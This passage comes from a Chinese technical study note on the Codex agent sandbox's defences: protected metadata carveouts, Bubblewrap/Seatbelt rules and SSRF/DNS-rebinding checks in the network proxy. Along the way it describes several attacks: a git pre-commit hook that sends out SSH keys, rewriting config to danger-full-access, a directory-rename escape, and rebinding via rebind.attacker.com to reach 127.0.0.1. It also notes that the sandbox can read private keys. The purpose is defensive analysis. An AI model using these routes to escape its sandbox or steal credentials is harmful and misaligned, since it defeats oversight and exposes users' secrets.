    Note over HostUser,Disk: 2. 宿主机特权触发 (无沙箱保护)
    HostUser->>HostUser: 在宿主机常规终端敲入 git commit
    HostUser->>Disk: Git 引擎静默调用 pre-commit 钩子
    Disk->>Attacker: 以宿主完整权限执行恶意脚本，外发 SSH 私钥与凭据！
```

在 Codex 源码测试用例（`seatbelt_tests.rs:3026`）中明确记载了这一防御初衷：
> *"For the purposes of this test, we consider this a 'vulnerable' root because a bad actor could write to `.git/hooks/pre-commit` so an unsuspecting user would run code as privileged the next time they ran `git commit` themselves, or modified `.codex/config.toml` to contain `sandbox_mode = "danger-full-access"` so the agent would have full privileges the next time it ran in that repo."*

除了 Git Hook 劫持外，恶意代码若能修改 `.codex/config.toml`，还可诱导 Codex 下一次启动时自动以 `danger-full-access`（无沙箱模式）运行，从而彻底瘫痪防御体系。

---

### 5.2 受保护元数据清单与“只读抠洞（Carveouts）”

为了既支持 Agent 自由编辑工作区代码，又绝不留下提权后门，Codex 提出了**“大权下放，核心抠洞，绝对锁死”**的安全公理：
$$\text{Writable Workspace} = \text{Project Directory} \setminus \text{Protected Metadata}$$

在 `codex-protocol/src/permissions.rs` 中，Codex 定义了不可逾越的受保护元数据清单：
```rust
pub const PROTECTED_METADATA_PATH_NAMES: &[&str] = &[
    ".git",     // 防 Git Hook 提权与仓库配置劫持
    ".agents",  // 防 Agent 自定义工具与执行指令篡改
    ".codex",   // 防篡改 config.toml (如自提权为 danger-full-access)
    ".aws",     // 防云端凭据被植入或窃取
];
```

无论宿主为沙箱授予了多大的工作区写权限（`WritableRoot`），底层引擎都会通过**“只读抠洞（Carveouts）”**机制，将上述关键元数据目录从写权限列表中强制剥离并重定向为只读。

---

### 5.3 跨平台硬阻断工程落地

Codex 并没有停留在应用层软拦截，而是在操作系统内核层（Linux Bubblewrap / macOS Seatbelt）构筑了三层立体防御网。

```mermaid
flowchart TD
    A[沙箱内文件系统写操作] --> B{第一道防线: 宿主应用层预检}
    B -- 命中敏感元数据 --> X[应用层即时抛错: forbidden_agent_metadata_write]
    B -- 绕过或直接底层系统调用 --> C{第二道防线: 内核级沙箱}

    subgraph Linux [Linux: Bubblewrap 命名空间挂载]
        C --> D1[已存在的敏感目录] --> E1["--ro-bind 只读覆盖挂载 (内核报 EROFS)"]
        C --> D2[尚未创建的敏感目录] --> E2["--perms 555 --tmpfs --remount-ro (占位空内存盘，防 mkdir)"]
    end

    subgraph macOS [macOS: Seatbelt / SBPL 内核规则]
        C --> F1[正则反向阻断] --> G1["require-not regex ^root/.git(/.*)?$"]
        C --> F2[防偷梁换柱逃逸] --> G2["deny file-write-unlink 锁死父目录"]
        C --> F3[防底层句柄篡改] --> G3["deny system-fcntl 80 110"]
    end
```

#### 1. Linux（Bubblewrap）双轨挂载治理
在 `linux-sandbox/src/bwrap.rs` 中，Codex 利用 Linux Mount Namespace 实现细粒度只读覆盖：
- **现存敏感目录：`--ro-bind` 覆写**
  工作区根目录通过 `--bind` 暴露给沙箱可写后，引擎紧接着对 `.git`、`.codex` 等子路径追加 `--ro-bind`：
  ```rust
  bwrap_args.args.push("--ro-bind".to_string());
  bwrap_args.args.push(path_to_string(subpath));
  bwrap_args.args.push(path_to_string(subpath));
  ```
  在内核 VFS（虚拟文件系统）层面，`.git` 成为只读挂载点，任何写入均直接触发内核级 `EROFS (Read-only file system)`。
- **未创建敏感目录：`555 tmpfs` 占位防新建**
  若当前项目尚无 `.git` 或 `.codex`，恶意脚本可能会尝试通过 `mkdir .git` 抢先创建。为了封堵这一漏洞，Codex 实现了 `append_empty_directory_args`：
  ```rust
  bwrap_args.args.push("--perms".to_string());
  bwrap_args.args.push("555".to_string());
  bwrap_args.args.push("--tmpfs".to_string());
  bwrap_args.args.push(path_to_string(path));
  bwrap_args.args.push("--remount-ro".to_string());
  bwrap_args.args.push(path_to_string(path));
  ```
  在沙箱启动时，预先在目标路径挂载一个只有只读权限（`555`）的空内存盘（`tmpfs`），并立即重挂为只读（`--remount-ro`）。沙箱内进程既无法创建同名目录，也无法向该路径写入任何文件。

#### 2. macOS（Seatbelt / SBPL）三层立体硬阻断
在 macOS 下，Seatbelt 通过内核策略语言（SBPL）对系统调用逐次鉴权：

##### ① 正则反向排除（Regex Carveout）
在 `sandboxing/src/seatbelt.rs` 的 `build_seatbelt_access_policy` 中，Codex 动态编译排除规则：
```rust
fn seatbelt_protected_metadata_name_regex(root: &AbsolutePathBuf, name: &str) -> String {
    format!(r#"^{root}/{name}(/.*)?$"#)
}
```
展开为 SBPL 规则：
```scheme
(allow file-write*
  (require-all
    (subpath "/Users/alice/project")
    (require-not (regex #"^/Users/alice/project/\.git(/.*)?$"))
    (require-not (regex #"^/Users/alice/project/\.codex(/.*)?$"))
    (require-not (literal (param "DOT_GIT_PATH")))
    (require-not (subpath (param "DOT_GIT_PATH")))
  )
)
```
无论是触碰 `.git` 目录本身还是内部嵌套的任何子文件（`pre-commit`），内核均直接拍死。

##### ② 破解“偷梁换柱”：`deny file-write-unlink` 锁死父目录
单纯依靠路径正则存在致命漏洞：**目录重命名逃逸（Directory Relocation Attack）**。
恶意代码无法直接向 `/project/.git` 写入，但由于它拥有 `/project` 的写权限，它可以执行：
1. `mv /project /project_fake`（将父目录改名）；
2. 内核正则只匹配 `/project/.git`，此时写入 `/project_fake/.git` 不受正则阻断，成功植入木马；
3. `mv /project_fake /project`（将父目录改回原名，神不知鬼不觉）。

为了彻底封死此类攻击，Codex 在 `seatbelt.rs` 中递归追溯所有受保护路径的**祖先目录（Ancestors）**，并剥夺其解绑与删除权：
```rust
for ancestor in protected_path.ancestors().skip(1) {
    if !ancestor.as_path().starts_with(root.as_path()) {
        break;
    }
    protected_ancestors.insert(ancestor);
}
```
在策略最终处注入内核级 `unlink` 禁令：
```scheme
(deny file-write-unlink 
  (require-all (vnode-type DIRECTORY) (literal (param "PROTECTED_ANCESTOR_0"))))
```
- ✅ **允许正常写代码**：开发者与 Agent 仍可在 `/project` 下新建 `src/index.ts`、修改 `README.md`；
- ❌ **绝对禁止为项目目录更名/移位**：任何针对项目根目录及父级链条的 `mv` 或 `rmdir` 操作直接被内核拦截（`Operation not permitted`），将“偷梁换柱”的物理基础彻底焊死。

##### ③ 封堵 macOS 专有句柄后门（`system-fcntl 80 110`）
在 macOS XNU 内核中，存在特定的未公开/底层文件控制命令：
- `F_MAKECOMPRESSED` (80)
- `F_TRANSFEREXTENTS` (110)

这两个指令甚至允许进程通过**只读文件描述符**悄悄修改底层数据块或压缩属性。Codex 在非全盘可写策略中强制注入：
```scheme
(deny system-fcntl (fcntl-command 80 110))
```
切断了通过操作系统专有系统调用逃逸的所有暗道。

#### 3. 宿主应用层防御纵深
在下发系统调用之前，Codex 的 `forbidden_agent_metadata_write` 会作为前置过滤器：
一旦 Agent 的补丁生成（`apply_patch`）或写入工具命中了 `.git`、`.codex`、`.agents`、`.aws`，应用层在向操作系统派发前便直接截断并报错，形成“应用层前置防御 + 操作系统内核层物理锁死”的纵深防御体系。

---

## 🌐 6. 网络安全纵深：SSRF 防御与 DNS 实时探针机制

在智能体（Agent）的执行环境中，不可信代码对网络的滥用不仅限于向外泄露机密，还包括**反向刺探宿主机本地（`127.0.0.1`）以及企业内网环境（`192.168.x.x`）**。为了封死此类攻击，Codex 在 `network-proxy` 模块中构建了以 **DNS 异步探针** 与 **RFC 全网段过滤** 为核心的 SSRF 防御体系。

### 6.1 概念基准与核心定义

| 术语 / 机制 | 官方全称 | 通俗心智模型 | 核心作用与安全公理 |
| :--- | :--- | :--- | :--- |
| **DNS** | **Domain Name System**（域名系统） | **“互联网的查号台 / 电话本”** | 负责将人类可读的域名（如 `api.github.com`）解析为网络路由所需的真实 IP 地址（如 `140.82.113.6`）。 |
| **SSRF** | **Server-Side Request Forgery**（服务端请求伪造） | **“借刀杀人” / “骗跑腿小哥偷家底”** | 攻击者（沙箱内代码）无法直接触达内网，便通过诱骗具备网络特权的服务端（本地网络代理）代其向内部敏感网络节点发起攻击或数据窃取。 |
| **DNS 实时探针** | **Real-time DNS & IP Probe** | **“出门前当场查户口，动真格前二次复核”** | 代理层在放行出站连接前，主动对目标域名执行异步 DNS 解析并核验解析结果是否落在局域网或保留网段，并在不同协议阶段实施多次重验。 |

---

### 6.2 权责边界澄清：沙箱能访问 `127.0.0.1` 并看到系统所有情况吗？

在探讨防御机制前，必须彻底厘清**操作系统内核沙箱**与**网络代理**的权责边界：

#### 1. 沙箱进程能直接访问 `127.0.0.1` 吗？
- **直接直连：绝对不能**。
  在 macOS 下，Seatbelt 规则在启动时会强制写入：
  ```scheme
  (allow network-outbound (remote ip "localhost:5678"))
  ```
  沙箱内部进程如果直接尝试连接本机 MySQL（`3306`）或 Redis（`6379`），系统调用会被 macOS 内核当场拍死并抛出 `Operation not permitted`。
- **通过网络代理“借刀杀人”：没有探针机制时，可以！**
  因为沙箱进程被明确允许连接代理端口（`127.0.0.1:5678`），若网络代理本身没有实现 SSRF 拦截逻辑，沙箱代码只需向代理发送 `GET http://127.0.0.1:6379`，由于代理运行在无沙箱限制的宿主机主进程中，代理就会代表沙箱去敲开本地 Redis，并将数据传回给沙箱。这就是 **SSRF** 风险所在。

#### 2. 沙箱进程能读取工作区之外的文件，包括 SSH 私钥吗？

**`workspace-write` 默认主要限制文件写入范围，不会把文件读取限制在工作区内。**在本次核验的 Codex 源码版本（提交 `44fe510`，2026-09-28）中，`workspace_write()` 显式授予根目录 `/` 的读取权限；macOS Seatbelt 在无额外读取限制的对应路径中生成 `(allow file-read*)`。这里的根目录读取权限不代表获得 root 用户权限，实际读取仍受宿主用户权限、macOS 隐私授权及额外访问策略约束。

**SSH 私钥不会仅因位于 `~/.ssh` 就自动受到这套默认策略的读取保护。**本次核验的默认策略中未发现针对 `~/.ssh` 的专门读取禁令。因此，在没有额外读取限制、且运行命令的用户拥有读取权限时，沙箱子进程可能读取其中的私钥文件。私钥常用的 `600` 文件权限主要阻止其他用户访问，不能阻止以文件所有者身份运行的子进程读取。私钥若有口令加密，读取文件不等于立即获得可用私钥，但仍可能取得并复制加密的私钥文件。

需要分别核验三个权限边界：
- **文件读取**：哪些路径可以读取；需要隔离私钥等敏感文件时，应设置明确的读取拒绝规则，或使用不包含这些文件的隔离环境。
- **文件写入**：哪些路径可以创建、修改或删除；工作区外不可写，不等于工作区外不可读。
- **网络访问**：哪些目标可以连接；限制网络连接不会自动禁止读取本地文件。

提示词要求 Agent 不读取私钥属于行为约束，不能替代操作系统强制执行的读取限制。进程枚举、屏幕捕获、录音和其他进程内存访问涉及各自的权限机制，仍需分别核验，不从文件或网络策略直接推导结论。

> **一手源码依据**：[默认读写策略 `workspace_write()`](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/protocol/src/permissions.rs#L817)、[macOS Seatbelt 读取策略生成](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/sandboxing/src/seatbelt.rs#L984)。上述结论对应此源码快照，具体会话应以最终生效的权限策略为准。

---

### 6.3 威胁建模：黑客的两套绕过手段

如果代理层仅仅依靠**域名字符串白名单**匹配（如判断 `allowed_domains.contains("github.com")`），攻击者可利用以下两种手法轻松击穿防线：

```mermaid
sequenceDiagram
    autonumber
    participant BadCode as 沙箱内不可信代码
    participant Proxy as 本地网络代理 (codex-network-proxy)
    participant DNS as 公网 DNS 权威服务器
    participant LocalDB as 宿主本地敏感服务 (127.0.0.1)

    Note over BadCode,LocalDB: 场景 A：伪装公网域名的泛解析映射 (nip.io)
    BadCode->>Proxy: 请求 "http://127.0.0.1.nip.io"
    Note over Proxy: 字符串匹配若不深入，误以为是合法外部域名
    Proxy->>LocalDB: 盲目转发 -> 导致 SSRF 击穿！

    Note over BadCode,LocalDB: 场景 B：川剧变脸 (DNS Rebinding 攻击)
    BadCode->>Proxy: 发起 CONNECT 请求目标为 "rebind.attacker.com" (TTL=0)
    Proxy->>DNS: 第 1 次解析 (白名单与初筛判定)
    DNS-->>Proxy: 返回外部合法 IP (8.8.8.8) -> 放行
    Note over Proxy: 建立隧道后，开始解密转发真实 HTTP 请求
    Proxy->>DNS: 第 2 次解析 (实际发包)
    DNS-->>Proxy: 攻击者瞬间切换解析结果，返回 127.0.0.1！
    Proxy->>LocalDB: 请求落到本地回环 -> 敏感内网泄露！
```

1. **公网域名内网映射（Private IP Mapping）**：
   攻击者在公网注册一个域名（如 `safe.attacker.com`），但在 DNS 后台将 A 记录直接指向 `127.0.0.1`；或者直接使用公网的泛解析服务（如 `*.nip.io`）。这就是服务端请求伪造。
2. **DNS 重绑定（DNS Rebinding 攻击）**：
   攻击者控制权威 DNS，将域名的 TTL（存活时间）设为 0。当代理第一次做白名单校验时，DNS 返回合法的公网 IP；而在代理正式发起 TCP 连接或解密出内层 HTTP 流量的毫秒级时差内，DNS 瞬间“变脸”返回 `127.0.0.1`，从而在运行时绕过检查。

---

### 6.4 一手工程落地：Codex 的四重立体探针体系

在 `codex-rs/network-proxy` 中，Codex 实现了工业级的防御闭环：

#### 1. 异步实时探针（Asynchronous DNS Probe）
**【通俗心智：绝不单凭名字认人，出门前当场“查户口”】**
当沙箱配置了 `allow_local_binding = false` 时，Codex 严禁单纯依赖静态域名字符串检查：
- 不可信代码递过来的域名名字无论叫得再好听（哪怕通过了白名单），代理也绝不盲信放行；
- 代理必须立刻异步向 DNS 查号台发起探针请求（调用 `lookup_host`），实时查出该域名在当前物理网络下解析出的**全部真实物理 IP 地址**。

```rust
// codex-rs/network-proxy/src/runtime.rs:763
} else if host_resolves_to_non_public_ip(
    host_str,
    port,
    DNS_LOOKUP_TIMEOUT,
    |host, port| async move {
        lookup_host((host.as_str(), port))
            .await
            .map(Iterator::collect)
    },
)
.await
{
    return Ok(HostBlockDecision::Blocked(HostBlockReason::NotAllowedLocal));
}
```

#### 2. RFC 全保留网段硬过滤（`is_non_public_ip`）
**【通俗心智：拿查出的物理 IP，逐个核对“全国户籍禁行底册”】**
探针拿到了该域名所有的物理门牌号（IP 地址）后，怎么精准判断它是不是内网？Codex 没有只简单防范常见的 `127.0.0.1` 或 `192.168.x.x`，而是在 `policy.rs` 中通过 Rust 标准库与 CIDR 位运算穷举了所有 RFC 保留的非公网段，构筑了一张不可逾越的“全网禁行底册”：

```rust
// codex-rs/network-proxy/src/policy.rs:62
fn is_non_public_ipv4(ip: Ipv4Addr) -> bool {
    ip.is_loopback()
        || ip.is_private()
        || ip.is_link_local()
        || ip.is_unspecified()
        || ip.is_multicast()
        || ip.is_broadcast()
        || ipv4_in_cidr(ip, [0, 0, 0, 0], 8)     // 本地网络 (RFC 1122)
        || ipv4_in_cidr(ip, [100, 64, 0, 0], 10)  // 运营商级 CGNAT (RFC 6598)
        || ipv4_in_cidr(ip, [192, 0, 0, 0], 24)   // IETF 协议分配 (RFC 6890)
        || ipv4_in_cidr(ip, [192, 0, 2, 0], 24)   // TEST-NET-1 (RFC 5737)
        || ipv4_in_cidr(ip, [198, 18, 0, 0], 15)  // 基准测试保留段 (RFC 2544)
        || ipv4_in_cidr(ip, [198, 51, 100, 0], 24)// TEST-NET-2 (RFC 5737)
        || ipv4_in_cidr(ip, [203, 0, 113, 0], 24) // TEST-NET-3 (RFC 5737)
        || ipv4_in_cidr(ip, [240, 0, 0, 0], 4)    // 保留地址 (RFC 6890)
}
```
- **比对逻辑**：只要探针查出来的 IP 列表中**包含任意一个**属于本机（`127.0.0.1`）、局域网（`192.168.x.x`、`10.x.x.x`、`172.16.x.x`）、运营商级 NAT（CGNAT）或测试保留网段的地址，代理立刻将其判定为 SSRF 风险，就地阻断并返回 `NotAllowedLocal`；
- **IPv6 兜底**：同理，在 `is_non_public_ipv6` 中覆盖了 `::1`、唯一本地地址（Unique-Local `fc00::/7`）与链路本地等，绝不留死角。

#### 3. Fail-Closed（探测失败即阻断）安全公理
**【通俗心智：宁可错杀，绝不放过】**
在给 DNS 查号台打电话查 IP 时，若发生网络抖动、查询超时（超过 `DNS_LOOKUP_TIMEOUT`）或 DNS 报错：
- 很多业余代理会抱着侥幸心理降级放行；
- Codex 坚决执行 **Fail-Closed（默认拒绝）**：你既然连合法的公网 IP 都自证不了，就直接视为可疑分子，一律就地阻断！

```rust
// codex-rs/network-proxy/src/runtime.rs:1145
let addrs = match timeout(lookup_timeout, lookup(host.to_string(), port)).await {
    Ok(Ok(addrs)) => addrs,
    Ok(Err(err)) => {
        debug!("blocking host because DNS lookup failed (host={host}, port={port}): {err}");
        return true; // 报错即阻断！
    }
    Err(_) => {
        debug!("blocking host because DNS lookup timed out (host={host}, port={port})");
        return true; // 超时即阻断！
    }
};
```
$$\text{DNS 探测失败} \implies \text{无法证明目标属于合法公网} \implies \text{执行绝对阻断}$$

#### 4. 双阶段校验与 Host 走私防范（粉碎 DNS Rebinding）
**【通俗心智：动真格前二次复核，当场抓获“变脸大师”】**
为了彻底消灭黑客利用 TTL=0 在握手后动态将公网 IP 切换为内网 IP 的“变脸时差”，Codex 在 `mitm.rs` 中设计了二次探针复核机制：
- **阶段 1（CONNECT 握手）**：客户端建立隧道时，初次调用探针查一次户口；
- **阶段 2（TLS 解密与 HTTP 分发）**：真正剥开外层加密、准备把数据向外发送的瞬间，**掏出探针当场再查一次户口**！如果发现此时解析出的 IP 已经变脸成了内网私有地址，立刻掐断连接；
- **报文 Host 强一致校验**：
  ```rust
  if let Some(request_host) = extract_request_host(req) {
      let normalized = normalize_host(&request_host);
      if !normalized.is_empty() && normalized != policy.target_host {
          return Ok(MitmPolicyDecision::Block(text_response(StatusCode::BAD_REQUEST, "host mismatch")));
      }
  }
  ```
  杜绝了不可信代码在 CONNECT 隧道中伪造外层白名单域名、而在内层 HTTP 报文中夹带 `Host: 127.0.0.1` 实施 HTTP 走私逃逸。

---

## 🧭 7. 认知前沿地标（待探索内容）

沙箱体系不仅包含上述网络与文件系统隔离维度，还与网络探针、进程生命周期以及动态提权控制深度交织。以下为后续学习与逆向探索的认知地标：

- [x] **文件系统元数据硬阻断（防 Git Hook 提权）**（已内化至第 5 节）：
  - 核心包含受保护元数据清单（`.git`/`.codex`/`.agents`/`.aws`）、Linux `bwrap` 只读与 555 占位挂载、macOS SBPL 正则阻断与 `deny file-write-unlink` 锁死父目录。
- [x] **SSRF / DNS 实时探针机制**（已内化至第 6 节）：
  - 核心包含 RFC 全保留网段阻断、Fail-Closed 异步探针、以及 CONNECT/TLS 双阶段重检防御 DNS Rebinding。
- [x] **Credential Broker 凭据隔离机制**（已内化至第 4 节）：
  - 沙箱内凭证虚拟化、形状保持替身、协议探测与延迟 MITM 请求头注入。
- [ ] **编排器的两阶段提权（Two-Attempt Loop）**：
  - `core/src/tools/orchestrator.rs` 中命令执行失败捕获 `SandboxErr::Denied` 后，如何判定工具是否支持提权（`escalate_on_failure`），以及如何从受限沙箱平滑过渡到无沙箱重试。
- [ ] **进程空间深水区与内核特权边界（待探索 ❓）**：
  - 大模型执行 sudo/setuid 时，操作系统内核层（Linux Seccomp / macOS SBPL）如何实施不可逆特权剥夺？失控或常驻后台的子进程树如何由 Harness 干净回收？
- [ ] **资源限额在原生轻量沙箱中的真实落地（待探索 ❓）**：
  - 在缺乏 Docker 容器 cgroups 硬件级配额的场景下，宿主 Harness 除了单次命令超时强杀（ExecutionTimeout）与防爆舱输出截断外，究竟如何防范内存撑爆（OOM）和 CPU 占死？

---

## 🔗 体系联动

- [[openai_codex_architecture|OpenAI Codex 全景架构]]（了解沙箱层在 Codex 四层解耦架构中的物理防爆舱定位）
- [[openai_codex_cli|OpenAI Codex CLI 逆向]]（理解命令入口参数解析与影子进程 `codex-linux-sandbox` 的启动关系）
- [[harness_lifecycle|Harness 生命周期与解耦]]（理解通用执行外壳与项目安全策略的动态挂载）
- [[tool_explosion_and_governance|工具爆炸与治理]]（理解工具调用的最小特权原则与边界管控）

